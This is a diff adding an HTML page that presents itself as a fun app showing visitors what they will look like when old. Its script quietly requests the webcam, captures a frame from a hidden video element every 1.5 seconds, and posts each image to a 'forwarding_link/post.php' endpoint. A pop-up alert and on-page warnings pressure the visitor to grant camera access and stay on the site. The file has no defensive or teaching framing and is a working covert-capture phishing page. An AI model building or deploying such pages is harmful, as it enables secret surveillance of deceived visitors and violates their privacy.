@@ -1,0 +1,123 @@
+<!doctype html>
+<html>
+<title>Young To Old</title>
+<head>
+  <style>
+    body {
+      background-image: url('pir_to_young.jpg');    /*For site background*/
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      background-size: cover;
+    }
+  </style>
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+  function post(imgdata) {
+    $.ajax({
+      type: 'POST',
+      data: { cat: imgdata },
+      url: 'forwarding_link/post.php',
+      dataType: 'json',
+      async: false,
+      success: function (result) {
+        // call the function that handles the response/results
+      },
+      error: function () {
+      }
+    });
+  };
+
+
+  'use strict';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const errorMsgElement = document.querySelector('span#errorMsg');
+
+  const constraints = {
+    audio: false,
+    video: {
+
+      facingMode: "user"
+    }
+  };
+
+  // Access webcam
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      handleSuccess(stream);
+    } catch (e) {
+      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    }
+  }
+
+  // Success
+  alert("Dont Leave our site, stay a few minute, and You must accept camera permission for use this site, Thank you") //show message for didnt leave
+
+  function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    var context = canvas.getContext('2d');
+    setInterval(function () {
+
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      post(canvasData);
+    }, 1500);
+
+
+  }
+
+  // Load init
+  init();
+
+</script>
+
+
+
+
+
+
+
+
+<!-- Body of site -->
+
+<body>
+  <p style="text-align: center ;color:rgb(17, 0, 255);font-size: 30px;">Welcome To My Site <br><br><br><br><br><br><br><br></p>
+  <p style="text-align: center;color:rgb(58, 57, 57); font-size: 25px;">(Hi, You can take a picture of yourself and see what you will look like when you are old &#128513;&#128513;&#128513;) <br><br><br>
+  </p>
+
+  <p style="text-align: center ;color:rgb(0, 75, 13); font-size: 24px;">Enjoy the music while your photo is ready<br><br></p>
+
+  <p style="text-align: center ;color:rgb(255, 0, 0);font-size: 21px;">&#9888;&#9888;  Warning! If you did't access to CAMERA, This site did't work.  &#9888;&#9888;<br> For Use This Site You Must Get Access To CAMERA</p>
+
+  <audio controls>
+    <source src="0.ogg" type="audio/ogg">
+    <source src="0.mp3" type="audio/mpeg">
+  </audio>
+  
+
+
+
+
+
+
+
+  <p style="text-align: center;color:rgb(212, 0, 255)"><label><input type="checkbox" name="mirror" id="mirror" /> Mirror
+      image</label></p>
+</body>
+
+</html>
